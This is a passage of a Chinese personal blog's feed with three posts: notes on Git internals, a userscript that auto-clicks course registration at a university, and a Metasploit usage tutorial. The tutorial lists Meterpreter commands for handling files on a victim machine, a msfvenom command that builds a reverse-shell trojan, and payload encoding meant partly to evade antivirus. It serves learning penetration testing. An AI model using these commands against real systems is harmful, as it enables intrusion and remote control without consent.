    &lt;p&gt;&lt;strong&gt;父提交&lt;/strong&gt; &lt;strong&gt;(parent(s)):&lt;/strong&gt; 提交(commit)的SHA1签名代表着当前提交前一步的项目历史. 上面的那个例子就只有一个父对象; 合并的提交(merge  commits)可能会有不只一个父对象. 如果一个提交没有父对象, 那么我们就叫它“根提交”(root commit),  它就代表着项目最初的一个版本(revision). 每个项目必须有至少有一个“根提交”(root  commit)。Git就是通过父提交把每个提交联系起来，也就是我们一般所说的提交历史。父提交就是当前提交上一版本。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt; &lt;strong&gt;:&lt;/strong&gt; 做了此次修改的人的名字,　还有修改日期.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;提交者（committer):&lt;/strong&gt; 实际创建提交(commit)的人的名字, 同时也带有提交日期. TA可能会和作者不是同一个人; 例如作者写一个补丁(patch)并把它用邮件发给提交者, 由他来创建提交(commit).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;提交说明&lt;/strong&gt; ：用来描述此次提交.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一个提交(commit)本身并没有包括任何信息来说明其做了哪些修改; 所有的修改(changes)都是通过与父提交(parents)的内容比较而得出的。 
一般用 git commit 来创建一个提交(commit), 这个提交(commit)的父对象一般是当前分支(current HEAD),　同时把存储在当前索引(index)的内容全部提交.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;commit&lt;/strong&gt;是使用频率最高的对象，一般在使用Git时，我们直接接触的就是commit。我们 &lt;em&gt;commit&lt;/em&gt;代码， &lt;em&gt;merge&lt;/em&gt;代码， &lt;em&gt;pull / push&lt;/em&gt;代码，重置版本库，查看历史，切换分支这些在开发流程中的基本操作都是直接和commit对象打交道。&lt;/p&gt;

&lt;h1 id=&quot;对象模型&quot;&gt;&lt;strong&gt;对象模型&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/git.jpg&quot; alt=&quot;git&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Icon每个目录都创建了 tree对象, 每个文件都创建了一个对应的 blob对象 . 最后有一个 commit对象  来指向根tree对象(root of trees),  这样我们就可以追踪项目每一项提交内容。除了第一个commit,每个commit对象都有一个父commit对象,父commit就是上一次的提交(历史 history)，这样就形成了一条提交历史链。Git就是通过这种方式组成了git版本库&lt;/p&gt;

&lt;h1 id=&quot;tag-对象&quot;&gt;&lt;strong&gt;Tag&lt;/strong&gt; &lt;strong&gt;对象&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;一个标签对象包括一个对象名, 对象类型, 标签名, 标签创建人的名字(“tagger”), 还有一条可能包含有签名(signature)的消息. 你可以用 &lt;strong&gt;*git cat-file -p*&lt;/strong&gt; 命令来查看这些信息。&lt;/p&gt;

&lt;p&gt;Tag对象就是里程碑的作用，一般在我们正式发布代码是需要建立一个里程碑。&lt;/p&gt;

&lt;h1 id=&quot;工作区暂存区版本库&quot;&gt;工作区、暂存区、版本库&lt;/h1&gt;</content><author><name></name></author><summary type="html">title:git实现原理 tags: git</summary></entry><entry><title type="html">西华大学抢课脚本</title><link href="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/" rel="alternate" type="text/html" title="西华大学抢课脚本" /><published>2020-06-29T00:00:00+08:00</published><updated>2020-06-29T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;环境配置&quot;&gt;环境配置&lt;/h1&gt;

&lt;p&gt;安装油猴插件&lt;/p&gt;

&lt;h1 id=&quot;脚本&quot;&gt;脚本&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// ==UserScript==
// @name         西华大学选课脚本
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://*/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  /**
   * 西华大学一键式选课脚本
   * 此脚本只能简单的代替你点击选课
   * 不保证成功率
   * 使用此脚本是您自愿使用的造成的损失作者概不负责·
   * @author WDF
   * 有问题请联系我
   * @QQ 2921235963
   */

  //把名字替换为你需要的课程名称
  let courseName = [&quot;足球&quot;, &quot;网球&quot;,&quot;桥牌&quot;]

  document.getElementsByClassName(&quot;panel panel-info&quot;)[0].getElementsByClassName(&quot;nav nav-tabs sl_nav_tabs&quot;)[0].getElementsByTagName(&quot;li&quot;)[1].getElementsByTagName(&quot;a&quot;)[0].click()

  let o = document.getElementById(&quot;more&quot;)
  for (let i = 0; i &amp;lt; 10; i++) {
    setTimeout(() =&amp;gt; {
      o.getElementsByTagName(&quot;a&quot;)[0].click()
    }, 1000)
  }

  let cnt = 0

  // 等待加载出课程
  setTimeout(() =&amp;gt; {
    console.log('loading...')

    //进入选课界面
    let courseList = document.getElementsByClassName(&quot;panel panel-info&quot;)
    for (let j = 0; j &amp;lt; courseName.length; j++) {
      cnt = cnt + 1
      if (j &amp;gt; 0)
        console.log(courseName[j - 1] + '选课成功!\n')

      console.log('当前准备选择的课程:' + courseName[j])
      let i
      // 搜索课程
      for (i = 1; i &amp;lt; courseList.length; i++) {
        setTimeout(() =&amp;gt; {
        }, 1000)

        let oo = courseList[i].getElementsByClassName(&quot;panel-heading kc_head&quot;)[0].getElementsByClassName(&quot;panel-title&quot;)[0]
        let thisText = oo.getElementsByClassName(&quot;kcmc&quot;)[0].getElementsByTagName(&quot;a&quot;)[0].innerText

        if (courseName[j] == thisText) {
          courseList[i].getElementsByClassName(&quot;panel-heading kc_head&quot;)[0].getElementsByClassName(&quot;panel-title&quot;)[0].click()
          break;
        }
      }
      let flag = false
      let map = new Map()
      const timer = setInterval(() =&amp;gt; {
        if (flag)
          clearInterval(timer)
        // 获取当前课程列表
        let list = courseList[i].getElementsByClassName(&quot;panel-body table-responsive&quot;)[0].getElementsByClassName(&quot;table table-hover&quot;)[0].getElementsByClassName(&quot;body_tr&quot;)

        for (let k = 0; k &amp;lt; list.length; k++) {
          if (map.has(k))
            continue
          let o = list[k].getElementsByClassName(&quot;an&quot;)[0].getElementsByClassName(&quot;btn btn-primary btn-sm&quot;)[0]
          if (o == null)
            o = list[k].getElementsByClassName(&quot;an&quot;)[0].getElementsByClassName(&quot;btn btn-danger btn-sm&quot;)[0]
          // console.log(k+&quot;---&quot;+o.innerText)
          if (o.innerText == &quot;选课&quot;) {
            o.click()
            setTimeout(() =&amp;gt; {
              let content = document.getElementsByClassName(&quot;modal-content&quot;)[0]
              if (content != null) {
                let message = content.getElementsByClassName(&quot;modal-body&quot;)[0].getElementsByClassName(&quot;bootbox-body&quot;)[0].getElementsByClassName(&quot;alert alert-modal&quot;)[0].innerText

                if (message == &quot;所选教学班的上课时间与其他教学班有冲突！&quot;)
                  map.set(k, '1')
                else if (message == &quot;一门课程最多可选1个志愿！&quot;)
                  clearInterval(timer)
                var ok_btn = content.getElementsByClassName(&quot;modal-footer ui-draggable-handle&quot;)[0].getElementsByClassName(&quot;btn btn-sm btn-default&quot;)[0]
                if (ok_btn != null)
                  ok_btn.click()
              }
            }, 750)
          } else {
            flag = true
            clearInterval(timer)
          }
          if (flag)
            break
        }
      }, 1500)

    }
  }, 2000)
  if (cnt == courseName.length)
    console.log('选课成功')


  // Your code here...
})();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;感谢吴同学分享的脚本,[github](https://github.com/Sherlockouo/script/tree/master/study&lt;/p&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">metasploit使用总结</title><link href="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="metasploit使用总结" /><published>2020-06-27T00:00:00+08:00</published><updated>2020-06-27T00:00:00+08:00</updated><id>http://localhost:4000/_posts/metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;h2 id=&quot;官网地址&quot;&gt;&lt;a href=&quot;https://www.metasploit.com/&quot;&gt;官网地址&lt;/a&gt;&lt;/h2&gt;

&lt;h2 id=&quot;版本&quot;&gt;版本&lt;/h2&gt;

&lt;p&gt;Metasploit的四个版本：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pro&lt;/strong&gt;：适用于渗透测试人员和IT安全团队&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Express&lt;/strong&gt;：适用于一般IT人员&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Community&lt;/strong&gt;：适用于小公司和学生&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Framework&lt;/strong&gt;：适用于开发人员和安全研究人员&lt;/p&gt;

&lt;h2 id=&quot;linux平台上安装&quot;&gt;Linux平台上安装&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \
chmod 755 msfinstall &amp;amp;&amp;amp; \
./msfinstall
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;详细过程参考官网&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;初始化&quot;&gt;初始化&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;service postgresql start &amp;amp;&amp;amp; msfdb init &amp;amp;&amp;amp; msfconsole
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是数据库初始化&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;metasploit结构&quot;&gt;Metasploit结构&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/home/admin233/博客/verylazycat.github.io/img/meta.png&quot; alt=&quot;meta&quot; /&gt;&lt;/h1&gt;

&lt;h2 id=&quot;目录结构&quot;&gt;目录结构&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;data目录：里面存放一些可编辑的文件，主要是给Metasploit使用
documentation目录：提供一些MSF的介绍文档等
external目录：源文件和第三方的库
lib目录：MSF框架的主要组成部分
modules目录：MSF的模块存放位置
plugins目录：存放Metasploit的插件
scripts目录：存放Meterpreter代码（shell code）或者是其他的脚本文件
tools目录：各种各样实用的命令行工具
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;help&quot;&gt;HELP&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)
### Examples
Terminate the first sessions:
    sessions -k 1
Stop some extra running jobs:
    jobs -k 2-6,7,8,11..15
Check a set of IP addresses:
    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
Target a set of IPv6 hosts:
    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
Target a block from a resolved domain name:
    set RHOSTS www.example.test/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;meterpreter&quot;&gt;Meterpreter&lt;/h1&gt;

&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;

&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。&lt;/p&gt;

&lt;p&gt;最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。&lt;/p&gt;

&lt;p&gt;需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况&lt;/p&gt;

&lt;h2 id=&quot;常用的反弹类型&quot;&gt;常用的反弹类型&lt;/h2&gt;

&lt;h3 id=&quot;reverse_tcp&quot;&gt;reverse_tcp&lt;/h3&gt;

&lt;p&gt;这是一个基于TCP的反向链接反弹shell, 使用起来很稳定&lt;/p&gt;

&lt;p&gt;使用下列命令生成一个Linux下反弹shell木马：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=你的IP lport=监听端口  -f elf -o shell
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;关于生成木马后续再提&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;然后我们打开Metasploit，使用模块handler，设置payload，注意：这里设置的payload要和我们生成木马所使用的payload一样,配置好参数就可以开始监听,当目标运行木马们就可以反弹shell了&lt;/p&gt;

&lt;h3 id=&quot;reverse_http&quot;&gt;reverse_http&lt;/h3&gt;

&lt;p&gt;基于http方式的反向连接，在网速慢的情况下不稳定&lt;/p&gt;

&lt;h3 id=&quot;bind_tcp&quot;&gt;bind_tcp&lt;/h3&gt;

&lt;p&gt;这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST&lt;/p&gt;

&lt;h2 id=&quot;payload&quot;&gt;Payload&lt;/h2&gt;

&lt;p&gt;Metasploit中的Payload模块主要有以下三种类型：&lt;/p&gt;

&lt;p&gt;-Single&lt;/p&gt;

&lt;p&gt;-Stager&lt;/p&gt;

&lt;p&gt;-Stage&lt;/p&gt;

&lt;p&gt;Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似&lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;netcat&lt;/a&gt;这样的非metasploit处理工具所捕捉到。&lt;/p&gt;

&lt;p&gt;Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。&lt;/p&gt;

&lt;p&gt;Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制&lt;/p&gt;

&lt;h2 id=&quot;meterpreter的常用命令&quot;&gt;Meterpreter的常用命令&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;help# 查看Meterpreter帮助
background#返回，把meterpreter后台挂起
bgkill# 杀死一个背景 meterpreter 脚本
bglist#提供所有正在运行的后台脚本的列表
bgrun#作为一个后台线程运行脚本
channel#显示活动频道
sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
sesssions -k  number #与会话进行交互
close# 关闭通道
exit# 终止 meterpreter 会话
quit# 终止 meterpreter 会话
interact id #切换进一个信道
run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
irb# 进入 Ruby 脚本模式
read# 从通道读取数据
write# 将数据写入到一个通道
run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
use# 加载 meterpreter 的扩展
load/use#加载模块

Resource#执行一个已有的rc脚本

2.文件系统命令

cat c:\boot.ini#查看文件内容,文件必须存在

del c:\boot.ini #删除指定的文件

upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\

download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/

edit c:\boot.ini  # 编辑文件

getlwd#打印本地目录

getwd#打印工作目录

lcd#更改本地目录

ls#列出在当前目录中的文件列表

lpwd#打印本地目录

pwd#输出工作目录

cd c:\\ #进入目录文件下

rm file #删除文件

mkdir dier #在受害者系统上的创建目录

rmdir#受害者系统上删除目录

dir#列出目标主机的文件和文件夹信息

mv#修改目标主机上的文件名

search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc

meterpreter &amp;gt; search -f autoexec.bat  #搜索文件

meterpreter &amp;gt; search -f sea*.bat c:\\xamp\\

enumdesktops     #用户登录数
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;msfvenom&quot;&gt;msfvenom&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;木马生成工具&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;help-1&quot;&gt;HELP&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Options:
-p, --payload    &amp;lt;payload&amp;gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;amp;#039;-&amp;amp;#039;或者stdin指定
-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled    &amp;lt;length&amp;gt;        为payload预先指定一个NOP滑动长度
-f, --format     &amp;lt;format&amp;gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       &amp;lt;architecture&amp;gt;  指定payload的目标架构
--platform   &amp;lt;platform&amp;gt;      指定payload的目标平台
-s, --space      &amp;lt;length&amp;gt;        设定有效攻击荷载的最大长度
-b, --bad-chars  &amp;lt;list&amp;gt;          设定规避字符集，比如: &amp;amp;#039;\x00\xff&amp;amp;#039;
-i, --iterations &amp;lt;count&amp;gt;         指定payload的编码次数
-c, --add-code   &amp;lt;path&amp;gt;          指定一个附加的win32 shellcode文件
-x, --template   &amp;lt;path&amp;gt;          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
--payload-options            列举payload的标准选项
-o, --out   &amp;lt;path&amp;gt;               保存payload
-v, --var-name &amp;lt;name&amp;gt;            指定一个自定义的变量，以确定输出格式
--shellest                   最小化生成payload
-h, --help                       查看帮助选项
--help-formats               查看msf支持的输出格式列表
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;生成payload&quot;&gt;&lt;strong&gt;生成payload&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;生成payload，有有两个必须的选项：-p -f&lt;/p&gt;

&lt;p&gt;使用-p 来指定要使用的payload&lt;/p&gt;

&lt;p&gt;可以使用下面的命令来查看所有msf可用的payload列表&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-p选项也支持使用使用自定义的payload，需要使用 “-“，比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用-f 来指定payload的输出格式&lt;/p&gt;

&lt;p&gt;使用下面的命令，可以产看msf支持的输出格式&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom --help-formats
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;payload编码&quot;&gt;&lt;strong&gt;payload编码&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;如果你使用了-b选项（设定了规避字符集），会自动调用编码器&lt;/p&gt;

&lt;p&gt;其他情况下，你需要使用-e选项来使用编码模块，例如&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以使用下面的命令，来查看可用的编码器&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l encoders
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案&lt;/p&gt;

&lt;p&gt;可以使用下面的命令来进行迭代编码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;规避字符&quot;&gt;&lt;strong&gt;规避字符&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -b &amp;amp;#039;\x00&amp;amp;#039; -f raw
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>